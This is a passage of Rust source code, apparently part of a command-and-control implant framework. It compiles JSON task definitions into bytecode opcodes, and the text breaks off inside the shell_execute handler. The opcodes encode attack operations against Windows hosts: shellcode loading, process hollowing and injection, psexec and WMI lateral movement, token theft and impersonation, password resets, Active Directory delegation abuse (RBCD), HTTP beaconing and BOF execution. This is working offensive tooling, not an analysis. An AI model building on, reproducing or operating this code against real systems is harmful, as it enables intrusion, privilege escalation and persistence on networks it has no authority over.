//! Bytecode compiler - translates JSON task definitions to bytecode format

use base64::{engine::general_purpose::STANDARD as BASE64, Engine};
use serde_json::Value;
use std::collections::BTreeMap;

// Opcode definitions
const OPCODES: &[(&str, u8)] = &[
    ("end", 0x00),
    ("store_result", 0x01),
    ("get_shellcode", 0x02),
    ("sleep", 0x03),
    ("run_command", 0x04),
    ("get_cwd", 0x05),
    ("read_file", 0x06),
    ("write_file", 0x07),
    ("check_error", 0x08),
    ("conditional", 0x09),
    ("set_var", 0x0A),
    ("print_var", 0x0B),
    ("goto", 0x0C),
    ("migrate", 0x0D),
    ("list_procs", 0x0E),
    ("get_const", 0x0F),
    ("wmi_exec", 0x10),
    ("http_send", 0x11),
    ("sacrificial", 0x12),
    ("redirect_stdout", 0x13),
    ("shellcode_server", 0x14),
    ("resolve_hostname", 0x15),
    ("psexec", 0x16),
    ("generate_exe", 0x17),
    ("run_bof", 0x18),
    ("query_ldap", 0x19),
    ("set_ad_attr_str", 0x1A),
    ("set_ad_attr_bin", 0x1B),
    ("portscan", 0x1C),
    ("set_user_password", 0x1D),
    ("add_user_to_localgroup", 0x1E),
    ("remove_user_from_localgroup", 0x1F),
    ("get_user_sid", 0x20),
    ("add_user_to_group", 0x21),
    ("remove_user_from_group", 0x22),
    ("create_rbcd_ace", 0x23),
    ("reg_create_key", 0x24),
    ("reg_delete_key", 0x25),
    ("reg_set_value", 0x26),
    ("reg_query_value", 0x27),
    ("make_token", 0x28),
    ("impersonate_process", 0x29),
    ("enable_privilege", 0x2A),
    ("list_process_privs", 0x2B),
    ("list_thread_privs", 0x2C),
    ("delete_file", 0x2D),
    ("revert_to_self", 0x2E),
    ("start_service", 0x2F),
    ("delete_service", 0x30),
    ("create_thread", 0x31),
    ("generate_dll", 0x32),
    ("shell_execute", 0x33),
    ("shell_extract", 0x34),
    ("shell_execute_explorer", 0x35),
    ("load_library", 0x36),
    ("pyexec", 0x37),
    ("hollow", 0x38),
    ("migrate_apc", 0x39),
    ("register_service", 0x3A),
    ("exit_process", 0x3B),
    ("hollow_apc", 0x3C),
    ("frida_hook", 0x3F),
    ("frida_unhook", 0x40),
    ("tcp_session", 0x41),
    ("kill", 0x42),
    ("http_beacon", 0x43),
    ("mem_read", 0x44),
    ("dll_list", 0x45),
    ("mem_map", 0x46),
    ("malfind", 0x47),
    ("ldr_check", 0x48),
];

// Special length values for references
const VAR_REF_LEN: u16 = 0xFFFF;
const CONST_REF_LEN: u16 = 0xFFFD;
const MAX_LITERAL_LEN: u16 = 0xFFFC;

fn get_opcode(name: &str) -> Option<u8> {
    OPCODES.iter().find(|(n, _)| *n == name).map(|(_, c)| *c)
}

/// Parse a constant value to bytes
fn parse_constant(value: &Value) -> Result<Vec<u8>, String> {
    match value {
        Value::String(s) => Ok(s.as_bytes().to_vec()),
        Value::Object(obj) => {
            if let Some(hex) = obj.get("hex").and_then(|v| v.as_str()) {
                hex::decode(hex).map_err(|e| format!("Invalid hex: {}", e))
            } else if let Some(b64) = obj.get("base64").and_then(|v| v.as_str()) {
                BASE64.decode(b64).map_err(|e| format!("Invalid base64: {}", e))
            } else {
                Err("Invalid constant format".into())
            }
        }
        _ => Err("Invalid constant type".into()),
    }
}

/// Parsed argument result
struct ParsedArg {
    data: Vec<u8>,
    is_var_ref: bool,
    is_const_ref: bool,
}

/// Parse an argument value
fn parse_arg_value(value: &Value, for_set_var: bool) -> Result<ParsedArg, String> {
    match value {
        Value::String(s) => {
            // Check for variable reference: $n
            if let Some(caps) = regex::Regex::new(r"^\$(\d+)$")
                .unwrap()
                .captures(s)
            {
                let var_id: u16 = caps[1].parse().map_err(|e| format!("Bad var ref: {}", e))?;
                return Ok(ParsedArg {
                    data: var_id.to_le_bytes().to_vec(),
                    is_var_ref: true,
                    is_const_ref: false,
                });
            }

            // Check for constant reference: %n
            if let Some(caps) = regex::Regex::new(r"^%(\d+)$")
                .unwrap()
                .captures(s)
            {
                let const_idx: u16 = caps[1].parse().map_err(|e| format!("Bad const ref: {}", e))?;
                return Ok(ParsedArg {
                    data: const_idx.to_le_bytes().to_vec(),
                    is_var_ref: false,
                    is_const_ref: true,
                });
            }

            // Plain string
            let mut data = s.as_bytes().to_vec();
            if for_set_var {
                let mut prefixed = vec![0u8; 5];  // opcode(1) + status(4)
                prefixed.extend(&data);
                data = prefixed;
            }
            Ok(ParsedArg {
                data,
                is_var_ref: false,
                is_const_ref: false,
            })
        }
        Value::Number(n) => {
            let data = if let Some(i) = n.as_i64() {
                if i < 256 {
                    vec![i as u8]
                } else if i < 65536 {
                    (i as u16).to_le_bytes().to_vec()
                } else {
                    (i as u32).to_le_bytes().to_vec()
                }
            } else {
                return Err("Invalid number".into());
            };
            Ok(ParsedArg {
                data,
                is_var_ref: false,
                is_const_ref: false,
            })
        }
        Value::Bool(b) => Ok(ParsedArg {
            data: vec![if *b { 1 } else { 0 }],
            is_var_ref: false,
            is_const_ref: false,
        }),
        Value::Object(obj) => {
            let mut data = if let Some(hex) = obj.get("hex").and_then(|v| v.as_str()) {
                hex::decode(hex).map_err(|e| format!("Invalid hex: {}", e))?
            } else if let Some(b64) = obj.get("base64").and_then(|v| v.as_str()) {
                BASE64.decode(b64).map_err(|e| format!("Invalid base64: {}", e))?
            } else {
                return Err("Invalid object format".into());
            };

            if for_set_var {
                let mut prefixed = vec![0u8; 5];  // opcode(1) + status(4)
                prefixed.extend(&data);
                data = prefixed;
            }

            Ok(ParsedArg {
                data,
                is_var_ref: false,
                is_const_ref: false,
            })
        }
        Value::Null => Ok(ParsedArg {
            data: vec![],
            is_var_ref: false,
            is_const_ref: false,
        }),
        _ => Err("Invalid argument type".into()),
    }
}

/// Encode an argument with length prefix
fn encode_arg(arg: &ParsedArg) -> Result<Vec<u8>, String> {
    let mut result = Vec::new();

    if arg.is_var_ref {
        result.extend(&VAR_REF_LEN.to_le_bytes());
    } else if arg.is_const_ref {
        result.extend(&CONST_REF_LEN.to_le_bytes());
    } else {
        if arg.data.len() > MAX_LITERAL_LEN as usize {
            return Err(format!(
                "Argument too long: {} bytes (max {})",
                arg.data.len(),
                MAX_LITERAL_LEN
            ));
        }
        result.extend(&(arg.data.len() as u16).to_le_bytes());
    }

    result.extend(&arg.data);
    Ok(result)
}

/// Helper to get string from JSON (optional, returns "" if missing)
fn get_str<'a>(task: &'a Value, key: &str) -> &'a str {
    task.get(key).and_then(|v| v.as_str()).unwrap_or("")
}

/// Require a field to be present; error if missing
fn require_field<'a>(task: &'a Value, key: &str) -> Result<&'a Value, String> {
    task.get(key).ok_or_else(|| {
        let op = task.get("op").and_then(|v| v.as_str()).unwrap_or("?");
        format!("op={op}: missing required field '{key}'")
    })
}

/// Require a field to be present and a non-negative integer
fn require_u64(task: &Value, key: &str) -> Result<u64, String> {
    require_field(task, key)?.as_u64().ok_or_else(|| {
        let op = task.get("op").and_then(|v| v.as_str()).unwrap_or("?");
        format!("op={op}: field '{key}' must be a non-negative integer")
    })
}

/// Require a field to be present and a non-empty string (variable refs like "$0" are allowed)
fn require_str<'a>(task: &'a Value, key: &str) -> Result<&'a Value, String> {
    let val = require_field(task, key)?;
    if let Some(s) = val.as_str() {
        if s.is_empty() {
            let op = task.get("op").and_then(|v| v.as_str()).unwrap_or("?");
            return Err(format!("op={op}: field '{key}' cannot be empty"));
        }
    }
    Ok(val)
}

/// Helper to get u64 from JSON
fn get_u64(task: &Value, key: &str, default: u64) -> u64 {
    task.get(key).and_then(|v| v.as_u64()).unwrap_or(default)
}

/// Helper to get bool from JSON
fn get_bool(task: &Value, key: &str, default: bool) -> bool {
    task.get(key).and_then(|v| v.as_bool()).unwrap_or(default)
}

/// Parse a pid argument, handling "all" as 0xFFFFFFFF sentinel
fn parse_pid_arg(value: &Value) -> Result<ParsedArg, String> {
    if let Some(s) = value.as_str() {
        if s.eq_ignore_ascii_case("all") {
            return Ok(ParsedArg {
                data: 0xFFFFFFFFu32.to_le_bytes().to_vec(),
                is_var_ref: false,
                is_const_ref: false,
            });
        }
        // Could be a variable reference like "$0"
        let parsed = parse_arg_value(value, false)?;
        if parsed.is_var_ref || parsed.is_const_ref {
            return Ok(parsed);
        }
        // Literal string number — pad to u32
        let mut data = parsed.data;
        if data.len() < 4 {
            let n = u32::from_le_bytes({
                let mut buf = [0u8; 4];
                buf[..data.len()].copy_from_slice(&data);
                buf
            });
            data = n.to_le_bytes().to_vec();
        }
        return Ok(ParsedArg { data, is_var_ref: false, is_const_ref: false });
    }
    // Numeric pid
    let parsed = parse_arg_value(value, false)?;
    let mut data = parsed.data;
    if !parsed.is_var_ref && !parsed.is_const_ref && data.len() < 4 {
        let n = u32::from_le_bytes({
            let mut buf = [0u8; 4];
            buf[..data.len()].copy_from_slice(&data);
            buf
        });
        data = n.to_le_bytes().to_vec();
    }
    Ok(ParsedArg { data, is_var_ref: parsed.is_var_ref, is_const_ref: parsed.is_const_ref })
}

/// Parse magic value (can be hex string or number)
fn parse_magic(value: &Value) -> Result<u32, String> {
    match value {
        Value::String(s) if s.starts_with("0x") => {
            u32::from_str_radix(&s[2..], 16).map_err(|e| format!("Invalid magic: {}", e))
        }
        Value::Number(n) => Ok(n.as_u64().unwrap_or(0) as u32),
        _ => Err("Invalid magic value".into()),
    }
}

/// Compile a single task to bytecode
fn compile_task(task: &Value) -> Result<Vec<u8>, String> {
    let op = get_str(task, "op");
    if op.is_empty() || op == "end" {
        return Ok(vec![0x00]);
    }

    let opcode = get_opcode(op).ok_or_else(|| format!("Unknown opcode: {}", op))?;
    let mut args: Vec<Vec<u8>> = Vec::new();

    match op {
        "store_result" => {
            let var_id = get_u64(task, "var", 0) as u16;
            args.push(encode_arg(&ParsedArg {
                data: var_id.to_le_bytes().to_vec(),
                is_var_ref: false,
                is_const_ref: false,
            })?);
        }

        "get_shellcode" => {
            if let Some(t) = task.get("task") {
                args.push(encode_arg(&parse_arg_value(t, false)?)?);
            }
            if let Some(m) = task.get("magic") {
                let magic = parse_magic(m)?;
                args.push(encode_arg(&ParsedArg {
                    data: magic.to_le_bytes().to_vec(),
                    is_var_ref: false,
                    is_const_ref: false,
                })?);
            }
        }

        "sleep" => {
            let ms = get_u64(task, "ms", 0) as u32;
            args.push(encode_arg(&ParsedArg {
                data: ms.to_le_bytes().to_vec(),
                is_var_ref: false,
                is_const_ref: false,
            })?);
        }

        "run_command" => {
            let cmd = require_str(task, "command")?;
            args.push(encode_arg(&parse_arg_value(cmd, false)?)?);
        }

        "get_cwd" | "list_procs" | "list_thread_privs" | "revert_to_self" => {
            // No args
        }

        "read_file" | "delete_file" | "redirect_stdout" | "load_library" => {
            let path = require_str(task, "path")?;
            args.push(encode_arg(&parse_arg_value(path, false)?)?);
        }

        "write_file" => {
            let path = require_str(task, "path")?;
            args.push(encode_arg(&parse_arg_value(path, false)?)?);
            // content is optional (can write empty file)
            let default_str = Value::String(String::new());
            let content = task.get("content").unwrap_or(&default_str);
            args.push(encode_arg(&parse_arg_value(content, false)?)?);
        }

        "check_error" => {
            let var_id = get_u64(task, "var", 0) as u16;
            args.push(encode_arg(&ParsedArg {
                data: var_id.to_le_bytes().to_vec(),
                is_var_ref: false,
                is_const_ref: false,
            })?);
        }

        "set_var" => {
            let var_id = get_u64(task, "var", 0) as u16;
            args.push(encode_arg(&ParsedArg {
                data: var_id.to_le_bytes().to_vec(),
                is_var_ref: false,
                is_const_ref: false,
            })?);
            let default_data = Value::String(String::new());
            let data = task.get("data").unwrap_or(&default_data);
            args.push(encode_arg(&parse_arg_value(data, true)?)?);
        }

        "print_var" => {
            if let Some(v) = task.get("var") {
                if !v.is_null() {
                    let var_id = v.as_u64().unwrap_or(0) as u16;
                    args.push(encode_arg(&ParsedArg {
                        data: var_id.to_le_bytes().to_vec(),
                        is_var_ref: false,
                        is_const_ref: false,
                    })?);
                }
            }
        }

        "goto" => {
            let target = get_u64(task, "target", 0) as u16;
            args.push(encode_arg(&ParsedArg {
                data: target.to_le_bytes().to_vec(),
                is_var_ref: false,
                is_const_ref: false,
            })?);
        }

        "conditional" => {
            // Args: [mode:u8][var1:u16][var2:u16?][true_target:u16][false_target:u16]
            let mode: u8 = match task.get("mode") {
                Some(Value::String(s)) => match s.as_str() {
                    "data"  => 0,
                    "error" => 1,
                    other   => return Err(format!("Unknown conditional mode: {other}")),
                },
                Some(v) => v.as_u64().unwrap_or(0) as u8,
                None => 0,
            };
            let var1 = get_u64(task, "var1", 0) as u16;
            args.push(encode_arg(&ParsedArg { data: vec![mode], is_var_ref: false, is_const_ref: false })?);
            args.push(encode_arg(&ParsedArg { data: var1.to_le_bytes().to_vec(), is_var_ref: false, is_const_ref: false })?);
            if let Some(v2) = task.get("var2").and_then(|v| v.as_u64()) {
                args.push(encode_arg(&ParsedArg { data: (v2 as u16).to_le_bytes().to_vec(), is_var_ref: false, is_const_ref: false })?);
            }
            // Accept both "true_target"/"false_target" and "true"/"false"
            let true_target = task.get("true_target").or_else(|| task.get("true"))
                .and_then(|v| v.as_u64()).unwrap_or(0) as u16;
            let false_target = task.get("false_target").or_else(|| task.get("false"))
                .and_then(|v| v.as_u64()).unwrap_or(0) as u16;
            args.push(encode_arg(&ParsedArg { data: true_target.to_le_bytes().to_vec(), is_var_ref: false, is_const_ref: false })?);
            args.push(encode_arg(&ParsedArg { data: false_target.to_le_bytes().to_vec(), is_var_ref: false, is_const_ref: false })?);
        }

        "get_const" => {
            // Args: [index:u16]
            let index = task.get("index").or_else(|| task.get("const_idx"))
                .and_then(|v| v.as_u64()).unwrap_or(0) as u16;
            args.push(encode_arg(&ParsedArg {
                data: index.to_le_bytes().to_vec(),
                is_var_ref: false,
                is_const_ref: false,
            })?);
        }

        "http_send" => {
            let default_get = Value::String("GET".into());
            let default_path = Value::String("/".into());
            let method = task.get("method").unwrap_or(&default_get);
            args.push(encode_arg(&parse_arg_value(method, false)?)?);
            let host = require_str(task, "host")?;
            args.push(encode_arg(&parse_arg_value(host, false)?)?);
            let port = get_u64(task, "port", 80) as u16;
            args.push(encode_arg(&ParsedArg {
                data: port.to_le_bytes().to_vec(),
                is_var_ref: false,
                is_const_ref: false,
            })?);
            let path = task.get("path").unwrap_or(&default_path);
            args.push(encode_arg(&parse_arg_value(path, false)?)?);
            let secure = if get_bool(task, "secure", false) { 1u8 } else { 0u8 };
            args.push(encode_arg(&ParsedArg {
                data: vec![secure],
                is_var_ref: false,
                is_const_ref: false,
            })?);
            let default_body = Value::String(String::new());
            let body = task.get("body").unwrap_or(&default_body);
            args.push(encode_arg(&parse_arg_value(body, false)?)?);
        }

        "create_thread" => {
            if let Some(t) = task.get("task_id").or_else(|| task.get("task")) {
                let task_id = t.as_u64().unwrap_or(0xFF) as u8;
                args.push(encode_arg(&ParsedArg {
                    data: vec![task_id],
                    is_var_ref: false,
                    is_const_ref: false,
                })?);
            }
            if let Some(m) = task.get("magic") {
                let magic = parse_magic(m)?;
                args.push(encode_arg(&ParsedArg {
                    data: magic.to_le_bytes().to_vec(),
                    is_var_ref: false,
                    is_const_ref: false,
                })?);
            }
        }

        "http_beacon" => {
            let default_str = Value::String(String::new());
            let host = task.get("host").unwrap_or(&default_str);
            args.push(encode_arg(&parse_arg_value(host, false)?)?);
            let port = get_u64(task, "port", 80) as u16;
            args.push(encode_arg(&ParsedArg {
                data: port.to_le_bytes().to_vec(),
                is_var_ref: false,
                is_const_ref: false,
            })?);
            let interval = get_u64(task, "interval", 5000) as u32;
            args.push(encode_arg(&ParsedArg {
                data: interval.to_le_bytes().to_vec(),
                is_var_ref: false,
                is_const_ref: false,
            })?);
            if task.get("secure").is_some() || task.get("agent_id").is_some() {
                let secure = task.get("secure")
                    .and_then(|s| s.as_bool())
                    .unwrap_or(false);
                let secure_byte = if secure { 1u8 } else { 0u8 };
                args.push(encode_arg(&ParsedArg {
                    data: vec![secure_byte],
                    is_var_ref: false,
                    is_const_ref: false,
                })?);
            }
            if let Some(aid) = task.get("agent_id") {
                args.push(encode_arg(&parse_arg_value(aid, false)?)?);
            }
        }

        "frida_hook" => {
            args.push(encode_arg(&parse_arg_value(require_str(task, "url")?, false)?)?);
            args.push(encode_arg(&parse_arg_value(require_str(task, "script")?, false)?)?);
            if let Some(n) = task.get("name") {
                args.push(encode_arg(&parse_arg_value(n, false)?)?);
            }
            if let Some(h) = task.get("callback_host") {
                args.push(encode_arg(&parse_arg_value(h, false)?)?);
            }
            if let Some(p) = task.get("callback_port") {
                let port = p.as_u64().unwrap_or(0) as u16;
                args.push(encode_arg(&ParsedArg {
                    data: port.to_le_bytes().to_vec(),
                    is_var_ref: false,
                    is_const_ref: false,
                })?);
            }
            if let Some(bs) = task.get("batch_size") {
                let val = bs.as_u64().unwrap_or(50) as u32;
                args.push(encode_arg(&ParsedArg {
                    data: val.to_le_bytes().to_vec(),
                    is_var_ref: false,
                    is_const_ref: false,
                })?);
            }
            if let Some(fi) = task.get("flush_interval") {
                let val = fi.as_u64().unwrap_or(5000) as u32;
                args.push(encode_arg(&ParsedArg {
                    data: val.to_le_bytes().to_vec(),
                    is_var_ref: false,
                    is_const_ref: false,
                })?);
            }
        }

        "kill" => {
            if let Some(m) = task.get("magic") {
                let magic = parse_magic(m)?;
                args.push(encode_arg(&ParsedArg {
                    data: magic.to_le_bytes().to_vec(),
                    is_var_ref: false,
                    is_const_ref: false,
                })?);
            }
        }

        "mem_read" => {
            // Args: [address:hex_bytes][size:u32][pid:u32?]
            let default_str = Value::String(String::new());
            let addr = task.get("address").unwrap_or(&default_str);
            let parsed = parse_arg_value(addr, false)?;
            // Strip 0x prefix for hex string addresses
            let addr_arg = if !parsed.is_var_ref && !parsed.is_const_ref {
                let s = std::str::from_utf8(&parsed.data).unwrap_or("");
                let s = s.strip_prefix("0x").or_else(|| s.strip_prefix("0X")).unwrap_or(s);
                ParsedArg { data: s.as_bytes().to_vec(), is_var_ref: false, is_const_ref: false }
            } else {
                parsed
            };
            args.push(encode_arg(&addr_arg)?);
            let size = get_u64(task, "size", 0) as u32;
            args.push(encode_arg(&ParsedArg {
                data: size.to_le_bytes().to_vec(),
                is_var_ref: false,
                is_const_ref: false,
            })?);
            if let Some(p) = task.get("pid") {
                let pid_arg = parse_pid_arg(p)?;
                args.push(encode_arg(&pid_arg)?);
            }
        }

        "dll_list" | "mem_map" | "malfind" | "ldr_check" => {
            // Args: [pid:u32?] — "all" encodes as 0xFFFFFFFF sentinel
            if let Some(p) = task.get("pid") {
                let pid_arg = parse_pid_arg(p)?;
                args.push(encode_arg(&pid_arg)?);
            }
        }

        "portscan" => {
            // Args: [targets:bytes][ports:bytes]
            let targets = task.get("targets").or_else(|| task.get("host"))
                .ok_or_else(|| "op=portscan: missing required field 'targets'".to_string())?;
            if targets.as_str().map(|s| s.is_empty()).unwrap_or(false) {
                return Err("op=portscan: field 'targets' cannot be empty".to_string());
            }
            args.push(encode_arg(&parse_arg_value(targets, false)?)?);
            args.push(encode_arg(&parse_arg_value(require_str(task, "ports")?, false)?)?);
        }

        "migrate" => {
            // Args: [task_id:u8][search:bytes][magic:u32?]
            let task_id = require_u64(task, "task_id")? as u8;
            args.push(encode_arg(&ParsedArg {
                data: vec![task_id],
                is_var_ref: false,
                is_const_ref: false,
            })?);
            let default_str = Value::String(String::new());
            let search = task.get("search").unwrap_or(&default_str);
            let search_arg = if let Some(n) = search.as_i64() {
                // Numeric PID: encode as decimal string bytes so the implant can match by PID
                ParsedArg {
                    data: n.to_string().into_bytes(),
                    is_var_ref: false,
                    is_const_ref: false,
                }
            } else {
                parse_arg_value(search, false)?
            };
            args.push(encode_arg(&search_arg)?);
            if let Some(m) = task.get("magic") {
                let magic = parse_magic(m)?;
                args.push(encode_arg(&ParsedArg {
                    data: magic.to_le_bytes().to_vec(),
                    is_var_ref: false,
                    is_const_ref: false,
                })?);
            }
        }

        "migrate_apc" => {
            // Args: [image:bytes][task_id:u8][magic:u32?]
            let image = require_str(task, "image")?;
            args.push(encode_arg(&parse_arg_value(image, false)?)?);
            let task_id = require_u64(task, "task_id")? as u8;
            args.push(encode_arg(&ParsedArg {
                data: vec![task_id],
                is_var_ref: false,
                is_const_ref: false,
            })?);
            if let Some(m) = task.get("magic") {
                let magic = parse_magic(m)?;
                args.push(encode_arg(&ParsedArg {
                    data: magic.to_le_bytes().to_vec(),
                    is_var_ref: false,
                    is_const_ref: false,
                })?);
            }
        }

        "impersonate_process" => {
            // Args: [search:bytes] — search string (image name or cmdline)
            args.push(encode_arg(&parse_arg_value(require_str(task, "search")?, false)?)?);
        }

        "enable_privilege" => {
            // Args: [search:bytes][priv_name:bytes]
            // search is optional (empty = current process)
            let default = Value::String(String::new());
            let search = task.get("search").unwrap_or(&default);
            args.push(encode_arg(&parse_arg_value(search, false)?)?);
            let priv_name = task.get("privilege").or_else(|| task.get("priv_name"))
                .ok_or_else(|| "op=enable_privilege: missing required field 'privilege'".to_string())?;
            if priv_name.as_str().map(|s| s.is_empty()).unwrap_or(false) {
                return Err("op=enable_privilege: field 'privilege' cannot be empty".to_string());
            }
            args.push(encode_arg(&parse_arg_value(priv_name, false)?)?);
        }

        "list_process_privs" => {
            // Args: [search:bytes] — optional (empty = current process)
            let default = Value::String(String::new());
            let search = task.get("search").unwrap_or(&default);
            args.push(encode_arg(&parse_arg_value(search, false)?)?);
        }

        "frida_unhook" => {
            // Args: [hook_id:i32?][name:bytes?] - no args = unhook all
            if let Some(hook_id) = task.get("hook_id") {
                args.push(encode_arg(&parse_arg_value(hook_id, false)?)?);
            }
            if let Some(name) = task.get("name") {
                args.push(encode_arg(&parse_arg_value(name, false)?)?);
            }
        }

        "wmi_exec" => {
            // Args: [command:bytes][host:bytes][user:bytes][pass:bytes][domain:bytes]
            // host, user, pass, domain are optional (empty = local/current creds)
            let default_str = Value::String(String::new());
            let command = require_str(task, "command")?;
            args.push(encode_arg(&parse_arg_value(command, false)?)?);
            let host = task.get("host").unwrap_or(&default_str);
            args.push(encode_arg(&parse_arg_value(host, false)?)?);
            let user = task.get("user").unwrap_or(&default_str);
            args.push(encode_arg(&parse_arg_value(user, false)?)?);
            let pass = task.get("pass").unwrap_or(&default_str);
            args.push(encode_arg(&parse_arg_value(pass, false)?)?);
            let domain = task.get("domain").unwrap_or(&default_str);
            args.push(encode_arg(&parse_arg_value(domain, false)?)?);
        }

        "sacrificial" => {
            // Args: [image:bytes][task_id:u8][pipe_name:bytes?][search:bytes?][no_kill:u8?]
            let image = require_str(task, "image")?;
            args.push(encode_arg(&parse_arg_value(image, false)?)?);
            let task_id = require_u64(task, "task_id")? as u8;
            args.push(encode_arg(&ParsedArg { data: vec![task_id], is_var_ref: false, is_const_ref: false })?);
            if let Some(pipe) = task.get("pipe_name") {
                args.push(encode_arg(&parse_arg_value(pipe, false)?)?);
            }
            if let Some(search) = task.get("search") {
                args.push(encode_arg(&parse_arg_value(search, false)?)?);
            }
            if let Some(nk) = task.get("no_kill") {
                let v = if nk.as_bool().unwrap_or(false) { 1u8 } else { 0u8 };
                args.push(encode_arg(&ParsedArg { data: vec![v], is_var_ref: false, is_const_ref: false })?);
            }
        }

        "shellcode_server" => {
            // Args: [port:u16][magic_base:u32?]
            let port = get_u64(task, "port", 0) as u16;
            args.push(encode_arg(&ParsedArg {
                data: port.to_le_bytes().to_vec(),
                is_var_ref: false,
                is_const_ref: false,
            })?);
            if let Some(mb) = task.get("magic_base") {
                let magic = parse_magic(mb)?;
                args.push(encode_arg(&ParsedArg {
                    data: magic.to_le_bytes().to_vec(),
                    is_var_ref: false,
                    is_const_ref: false,
                })?);
            }
        }

        "resolve_hostname" => {
            // Args: [hostname:bytes]
            let hostname = require_str(task, "hostname")?;
            args.push(encode_arg(&parse_arg_value(hostname, false)?)?);
        }

        "psexec" => {
            // Args: [target:bytes][service_name:bytes][display_name:bytes][binary_path:bytes][service_bin:bytes]
            args.push(encode_arg(&parse_arg_value(require_str(task, "target")?, false)?)?);
            args.push(encode_arg(&parse_arg_value(require_str(task, "service_name")?, false)?)?);
            args.push(encode_arg(&parse_arg_value(require_str(task, "display_name")?, false)?)?);
            args.push(encode_arg(&parse_arg_value(require_str(task, "binary_path")?, false)?)?);
            args.push(encode_arg(&parse_arg_value(require_str(task, "service_bin")?, false)?)?);
        }

        "generate_exe" => {
            // Args: [task_id:u8]
            let task_id = require_u64(task, "task_id")? as u8;
            args.push(encode_arg(&ParsedArg { data: vec![task_id], is_var_ref: false, is_const_ref: false })?);
        }

        "run_bof" => {
            // Args: [bof_data:bytes][entry:bytes][inputs:bytes]
            // entry defaults to "go" (standard BOF convention); inputs is optional
            let default_entry = Value::String("go".into());
            let default_str = Value::String(String::new());
            let bof_data = require_field(task, "bof_data")?;
            args.push(encode_arg(&parse_arg_value(bof_data, false)?)?);
            let entry = task.get("entry").unwrap_or(&default_entry);
            args.push(encode_arg(&parse_arg_value(entry, false)?)?);
            let inputs = task.get("inputs").unwrap_or(&default_str);
            args.push(encode_arg(&parse_arg_value(inputs, false)?)?);
        }

        "query_ldap" => {
            // Args: [base:bytes][filter:bytes][scope:u8][attribute:bytes]
            // attribute is optional (empty = return all attributes)
            let default_str = Value::String(String::new());
            args.push(encode_arg(&parse_arg_value(require_str(task, "base")?, false)?)?);
            args.push(encode_arg(&parse_arg_value(require_str(task, "filter")?, false)?)?);
            let scope = task.get("scope").and_then(|v| v.as_u64()).unwrap_or(2) as u8;
            args.push(encode_arg(&ParsedArg { data: vec![scope], is_var_ref: false, is_const_ref: false })?);
            let attribute = task.get("attribute").unwrap_or(&default_str);
            args.push(encode_arg(&parse_arg_value(attribute, false)?)?);
        }

        "set_ad_attr_str" | "set_ad_attr_bin" => {
            // Args: [dn:bytes][attr:bytes][value:bytes]
            args.push(encode_arg(&parse_arg_value(require_str(task, "dn")?, false)?)?);
            args.push(encode_arg(&parse_arg_value(require_str(task, "attr")?, false)?)?);
            args.push(encode_arg(&parse_arg_value(require_field(task, "value")?, false)?)?);
        }

        "set_user_password" => {
            // Args: [server:bytes][username:bytes][password:bytes]
            // server is optional (empty = local machine)
            let default_str = Value::String(String::new());
            let server = task.get("server").unwrap_or(&default_str);
            args.push(encode_arg(&parse_arg_value(server, false)?)?);
            args.push(encode_arg(&parse_arg_value(require_str(task, "username")?, false)?)?);
            args.push(encode_arg(&parse_arg_value(require_str(task, "password")?, false)?)?);
        }

        "add_user_to_localgroup" | "remove_user_from_localgroup" |
        "add_user_to_group" | "remove_user_from_group" => {
            // Args: [server:bytes][group:bytes][username:bytes]
            // server is optional (empty = local machine)
            let default_str = Value::String(String::new());
            let server = task.get("server").unwrap_or(&default_str);
            args.push(encode_arg(&parse_arg_value(server, false)?)?);
            args.push(encode_arg(&parse_arg_value(require_str(task, "group")?, false)?)?);
            args.push(encode_arg(&parse_arg_value(require_str(task, "username")?, false)?)?);
        }

        "get_user_sid" => {
            // Args: [server:bytes][username:bytes]
            // server is optional (empty = local machine)
            let default_str = Value::String(String::new());
            let server = task.get("server").unwrap_or(&default_str);
            args.push(encode_arg(&parse_arg_value(server, false)?)?);
            args.push(encode_arg(&parse_arg_value(require_str(task, "username")?, false)?)?);
        }

        "create_rbcd_ace" => {
            // Args: [sid:bytes]
            args.push(encode_arg(&parse_arg_value(require_str(task, "sid")?, false)?)?);
        }

        "reg_create_key" | "reg_delete_key" => {
            // Args: [key:bytes]
            args.push(encode_arg(&parse_arg_value(require_str(task, "key")?, false)?)?);
        }

        "reg_set_value" => {
            // Args: [key:bytes][value_name:bytes][value_type:bytes][value:bytes]
            // value_type defaults to REG_SZ
            let default_type = Value::String("REG_SZ".into());
            args.push(encode_arg(&parse_arg_value(require_str(task, "key")?, false)?)?);
            args.push(encode_arg(&parse_arg_value(require_str(task, "value_name")?, false)?)?);
            let value_type = task.get("value_type").unwrap_or(&default_type);
            args.push(encode_arg(&parse_arg_value(value_type, false)?)?);
            args.push(encode_arg(&parse_arg_value(require_field(task, "value")?, false)?)?);
        }

        "reg_query_value" => {
            // Args: [key:bytes][value_name:bytes]
            args.push(encode_arg(&parse_arg_value(require_str(task, "key")?, false)?)?);
            args.push(encode_arg(&parse_arg_value(require_str(task, "value_name")?, false)?)?);
        }

        "make_token" => {
            // Args: [domain:bytes][username:bytes][password:bytes][logon_type:u8?]
            // domain is optional (empty = workgroup/UPN); username and password required
            let default_str = Value::String(String::new());
            let domain = task.get("domain").unwrap_or(&default_str);
            args.push(encode_arg(&parse_arg_value(domain, false)?)?);
            args.push(encode_arg(&parse_arg_value(require_str(task, "username")?, false)?)?);
            args.push(encode_arg(&parse_arg_value(require_str(task, "password")?, false)?)?);
            if let Some(lt) = task.get("logon_type") {
                let v = lt.as_u64().unwrap_or(9) as u8;
                args.push(encode_arg(&ParsedArg { data: vec![v], is_var_ref: false, is_const_ref: false })?);
            }
        }

        "start_service" | "delete_service" => {
            // Args: [target:bytes][service_name:bytes]
            // target is optional (empty = local machine)
            let default_str = Value::String(String::new());
            let target = task.get("target").unwrap_or(&default_str);
            args.push(encode_arg(&parse_arg_value(target, false)?)?);
            args.push(encode_arg(&parse_arg_value(require_str(task, "service_name")?, false)?)?);
        }

        "generate_dll" => {
            // Args: [task_id:u8][export_name:bytes]
            let task_id = require_u64(task, "task_id")? as u8;
            args.push(encode_arg(&ParsedArg { data: vec![task_id], is_var_ref: false, is_const_ref: false })?);
            let default_export = Value::String("Run".into());
            let export_name = task.get("export_name").unwrap_or(&default_export);
            args.push(encode_arg(&parse_arg_value(export_name, false)?)?);
        }

        "shell_execute" | "shell_execute_explorer" => {
            // Args: [path:bytes][verb:bytes][args:bytes]
            // verb and args are optional
            let default_str = Value::String(String::new());
            args.push(encode_arg(&parse_arg_value(require_str(task, "path")?, false)?)?);
            let verb = task.get("verb").unwrap_or(&default_str);
            args.push(encode_arg(&parse_arg_value(verb, false)?)?);
